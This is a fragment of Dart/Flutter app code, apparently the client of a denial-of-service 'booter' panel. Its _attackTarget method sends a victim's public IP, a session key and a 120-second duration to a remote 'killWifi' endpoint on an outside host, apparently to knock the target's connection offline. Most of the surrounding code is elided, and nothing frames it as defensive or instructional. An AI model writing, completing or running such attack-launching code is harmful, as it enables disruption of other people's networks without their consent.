...
class _WifiInternalPageState extends State<WifiInternalPage> {
  ...
  final Color cardDark = const Color(0xFF121212); // Card background (dark)
  ...
  Future<void> _attackTarget() async {
    ...
    final url = Uri.parse(
        "http://elainakurumipanelpanel.xtxintax.my.id:2045/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
